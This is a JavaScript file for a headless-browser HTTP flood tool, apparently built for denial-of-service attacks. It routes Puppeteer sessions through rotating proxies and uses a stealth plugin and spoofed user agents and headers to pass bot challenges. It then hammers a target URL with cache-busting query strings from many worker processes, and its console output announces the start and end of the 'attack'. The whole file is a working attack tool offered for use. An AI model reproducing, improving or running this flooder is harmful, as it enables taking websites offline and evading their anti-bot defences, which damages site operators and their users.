const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const cluster = require('cluster');
const fs = require('fs');

puppeteer.use(StealthPlugin());

// ============================================
// УТИЛИТЫ
// ============================================
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
}

function randomIntn(min, max) {
    return min + ((Math.random() * (max - min + 1)) | 0);
}

function randomElement(arr) {
    return arr[(Math.random() * arr.length) | 0];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

// ============================================
// АРГУМЕНТЫ
// ============================================
if (process.argv.length < 7) {
    console.log('Usage: node script.js [target] [time] [rate] [thread] [proxy]');
    console.log('Example: node script.js https://example.com 60 10 4 proxies.txt');
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
    pathFlag: process.argv.includes('--path')
};

let proxies = readLines(args.proxyFile);
const parsedTarget = new URL(args.target);

const useragents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/22B91 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
];

const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = ["en-US", "en-GB", "en", "de", "fr", "es", "pt-BR", "it", "ru", "ja"];

let startTime = Date.now();

// ============================================
// BUILD URL
// ============================================
function buildUrl() {
    let rand_path;
    if (args.pathFlag) {
        const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        rand_path = (parsedTarget.pathname || "/") + rand_query;
    } else {
        rand_path = parsedTarget.pathname || "/";
    }
    return `${parsedTarget.protocol}//${parsedTarget.host}${rand_path}`;
}

// ============================================
// RUN FLOODER
// ============================================
async function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const proxyShort = proxyAddr.length > 25 ? proxyAddr.substring(0, 25) + '...' : proxyAddr;
    let browser = null;
    
    try {
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                `--proxy-server=${proxyAddr}`,
                '--disable-blink-features=AutomationControlled'
            ],
            timeout: 15000,
            ignoreHTTPSErrors: true
        });
        
        const page = await browser.newPage();
        
        await page.setUserAgent(randomElement(useragents));
        await page.setViewport({
            width: randomIntn(1366, 1920),
            height: randomIntn(768, 1080)
        });
        
        await page.setExtraHTTPHeaders({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': randomElement(languages),
            'accept-encoding': 'gzip, deflate, br',
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': randomElement(fetch_site)
        });
        
        const initialResponse = await page.goto(args.target, {
            waitUntil: 'domcontentloaded',
            timeout: 15000
        });
        
        const statusCode = initialResponse.status();
        
        if (statusCode === 403) {
            console.log(`🛡️  BLOCKED [${proxyShort}] - Challenge failed (403)`);
            await browser.close();
            return;
        }
        
        if (statusCode >= 200 && statusCode < 400) {
            console.log(`✅ BYPASSED [${proxyShort}] - Challenge solved! Flooding...`);
            
            while (Date.now() - startTime < args.time * 1000) {
                const cycleStart = Date.now();
                
                for (let i = 0; i < args.Rate; i++) {
                    if (Date.now() - startTime >= args.time * 1000) {
                        break;
                    }
                    
                    try {
                        const targetUrl = buildUrl();
                        const response = await page.goto(targetUrl, {
                            waitUntil: 'domcontentloaded',
                            timeout: 8000
                        });
                        
                        const status = response.status();
                        
                        if (status === 403) {
                            console.log(`   ⚠️  [${proxyShort}] Got blocked mid-session`);
                            await browser.close();
                            return;
                        }
                        
                    } catch (error) {
                        // Игнорируем мелкие ошибки
                    }
                }
                
                const cycleTime = Date.now() - cycleStart;
                const waitTime = Math.max(0, 1000 - cycleTime);
                if (waitTime > 0) {
                    await new Promise(resolve => setTimeout(resolve, waitTime));
                }
            }
            
            console.log(`   ✅ [${proxyShort}] Session completed successfully`);
        } else {
            console.log(`❌ FAILED [${proxyShort}] - Unexpected status ${statusCode}`);
        }
        
        await browser.close();
        
    } catch (error) {
        if (error.message.includes('ERR_PROXY') || 
            error.message.includes('ERR_TUNNEL') ||
            error.message.includes('net::')) {
            console.log(`🔌 PROXY ERROR [${proxyShort}] - Connection failed`);
        } else if (error.message.includes('TimeoutError')) {
            console.log(`⏱️  TIMEOUT [${proxyShort}] - Request timed out`);
        } else {
            console.log(`❌ ERROR [${proxyShort}] - ${error.message.substring(0, 40)}`);
        }
        
        if (browser) {
            await browser.close();
        }
    }
}

// ============================================
// CLUSTER
// ============================================
if (cluster.isMaster) {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║         🚀 BROWSER FLOODER - MINIMAL OUTPUT              ║');
    console.log('╚═══════════════════════════════════════════════════════════╝\n');
    console.log(`Target:  ${args.target}`);
    console.log(`Time:    ${args.time}s`);
    console.log(`Rate:    ${args.Rate} req/sec per thread`);
    console.log(`Threads: ${args.threads}`);
    console.log(`Proxies: ${proxies.length}\n`);
    console.log('─'.repeat(60));
    console.log('Starting attack...\n');
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        console.log('\n' + '─'.repeat(60));
        console.log('Attack finished\n');
        process.exit(0);
    }, args.time * 1000);
    
} else {
    setInterval(runFlooder, 0);
}

process.on('uncaughtException', function (exception) {});
process.on('unhandledRejection', function (reason, promise) {});
